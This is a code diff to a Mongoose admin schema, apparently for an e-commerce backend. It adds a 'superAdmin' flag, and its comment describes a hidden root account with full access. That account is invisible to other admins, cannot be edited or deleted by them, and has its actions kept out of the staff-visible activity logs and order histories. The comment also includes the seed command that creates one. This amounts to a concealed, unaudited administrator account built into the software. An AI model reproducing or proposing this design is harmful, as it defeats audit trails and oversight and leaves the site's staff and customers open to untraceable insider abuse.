@@ -9,6 +9,14 @@ const AdminSchema = new mongoose.Schema({
   // Empty array = unrestricted (full access), matching legacy behaviour.
   permissions: { type: [String], default: [] },
 
+  // Hidden owner/root account. A superAdmin has full access (like a normal
+  // admin with empty permissions) but is deliberately invisible to the rest of
+  // the team: it is excluded from the Authorized-admins list, cannot be
+  // listed/edited/deleted by other admins, and its actions are NOT attributed
+  // in any staff-visible audit surface (product activity log, order status
+  // history, order pick). Create one with `node seedAdmin.js <email> <pass> [name] --super`.
+  superAdmin: { type: Boolean, default: false },
+
   // Security fields
   isActive: { type: Boolean, default: true },
   isLocked: { type: Boolean, default: false },
